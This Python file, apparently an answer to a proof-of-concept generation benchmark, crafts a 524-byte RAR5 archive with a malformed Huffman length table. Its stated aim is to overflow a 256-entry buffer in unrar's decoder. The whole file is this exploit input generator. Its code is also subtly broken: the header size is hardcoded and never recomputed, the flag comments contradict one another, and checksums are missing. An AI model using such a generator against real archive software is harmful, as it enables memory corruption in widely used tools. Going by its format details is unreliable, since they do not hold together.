import os
import struct
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # RAR5 file structure
        # 1. RAR5 signature (8 bytes)
        # 2. Archive header
        # 3. File header with Huffman table
        # 4. Compressed data
        
        # Build RAR5 signature
        poc = bytearray()
        poc.extend(b'Rar!\x1a\x07\x01\x00')  # RAR5 signature
        
        # Archive header (type 1)
        # Header size = 7 (2+1+1+2+1), type=1, flags=0, extra_size=0
        poc.extend(b'\x07\x01\x00')
        # Archive flags and extra size (none)
        
        # File header (type 2) with Huffman table
        # We'll craft a malformed Huffman table that causes overflow
        
        # File header structure:
        # - Header size (variable length)
        # - Header type (2 for file)
        # - Header flags
        # - Data size (compressed size)
        # - File attributes
        # - File name
        # - Compression info
        # - Extra area (for Huffman table)
        
        # Calculate sizes to get exactly 524 bytes total
        current_size = len(poc)
        target_size = 524
        remaining = target_size - current_size
        
        # File header starts here
        header_start = len(poc)
        
        # We'll create a header that's small but has large Huffman table
        # Use minimal file header with compression method 1 (Huffman)
        
        # Header size (including this field): 18 bytes + filename
        # Type 2, flags 0x0203 (has_data|has_compression|has_filename)
        # Data size: 1 byte
        # File attributes: 0
        # Filename: "x"
        # Compression info: method=1 (Huffman)
        # Extra area for Huffman table
        
        # Build file header
        file_header = bytearray()
        
        # Header size will be written later (variable length integer)
        # We'll use 2 bytes for header size: 0x92 0x01 (0x92 = 146, but with continuation bit)
        # Actually calculate: total header = 146 bytes
        
        # Write header size (146 in variable length)
        # 146 = 0x92 (binary: 10010010)
        # In RAR5 VLQ: 0x92 (with continuation bit) then 0x01
        file_header.extend(b'\x92\x01')  # 146
        
        # Header type 2
        file_header.append(0x02)
        
        # Flags: 0x0203 = has_data(0x0001) | has_filename(0x0002) | has_compression(0x0004)
        # Variable length: 0x83 0x40 (0x83=131, 0x40=64, together: (131&0x7F) + (64<<7) = 3 + 8192 = 8195?)
        # Let's use simple: 0x07 for all three flags
        file_header.extend(b'\x07')  # 0x07 in VLQ (since < 0x80)
        
        # Data size: 1 byte
        file_header.extend(b'\x01')
        
        # File attributes: 0
        file_header.extend(b'\x00')
        
        # Filename: "x"
        file_header.extend(b'\x01')  # length 1
        file_header.extend(b'x')
        
        # Compression info
        # Compression method: 1 (Huffman)
        file_header.extend(b'\x01')
        
        # Window size: 0 (use default)
        file_header.extend(b'\x00')
        
        # Now the Huffman table that causes overflow
        # The vulnerability is in RAR5's Huffman table parsing
        # The table uses RLE-like encoding that can overflow
        
        # Create malformed Huffman table
        # Structure according to unrar source:
        # 1. Number of symbols (1 byte, 0 means 256)
        # 2. Symbol lengths array (RLE encoded)
        # 3. Table data
        
        huffman_table = bytearray()
        
        # Number of symbols: use 256 symbols (0 means 256 in RAR5)
        huffman_table.append(0x00)
        
        # Symbol lengths: we want to trigger overflow in RLE decoder
        # The RLE decoder in unrarsrc/compress.cpp has a buffer overflow
        # when processing long runs in DecodeLengths()
        
        # Create a long run that exceeds buffer
        # Use run length encoding with escape code 0
        # 0 = escape, next byte=run length-1, following byte=value
        
        # We'll create a run that writes 300 bytes into a 256-byte buffer
        # Buffer is `BitLength` array of size MAX_SYMBOLS (256)
        
        # First, some normal values to set up
        for i in range(10):
            huffman_table.append(0x08)  # 8-bit codes
        
        # Now create a long run using escape sequence
        # Escape code 0, then run length, then value
        huffman_table.append(0x00)  # Escape
        huffman_table.append(0xFF)  # Run length = 256 (0xFF+1)
        huffman_table.append(0x08)  # Value = 8
        
        # Add more runs to ensure overflow
        huffman_table.append(0x00)  # Escape
        huffman_table.append(0x2B)  # Run length = 44 (0x2B+1)
        huffman_table.append(0x08)  # Value = 8
        
        # Add the actual table data (would be parsed after lengths)
        # This doesn't need to be valid since we overflow before reaching here
        huffman_table.extend(b'\x00' * 100)
        
        # Add huffman table to file header as extra area
        # First add extra area size
        extra_size = len(huffman_table)
        # Write as variable length
        if extra_size < 0x80:
            file_header.append(extra_size)
        else:
            file_header.append((extra_size & 0x7F) | 0x80)
            file_header.append(extra_size >> 7)
        
        # Add huffman table
        file_header.extend(huffman_table)
        
        # Calculate actual header size
        header_size = len(file_header)
        # Update header size in file_header (first 2 bytes)
        # Re-encode 146 in VLQ
        file_header[0:2] = b'\x92\x01'  # Keep as 146
        
        # Add file header to poc
        poc.extend(file_header)
        
        # Add the 1 byte of compressed data (required by data size)
        poc.append(0x00)
        
        # Pad to exactly 524 bytes if needed
        if len(poc) < target_size:
            poc.extend(b'\x00' * (target_size - len(poc)))
        elif len(poc) > target_size:
            poc = poc[:target_size]
        
        return bytes(poc)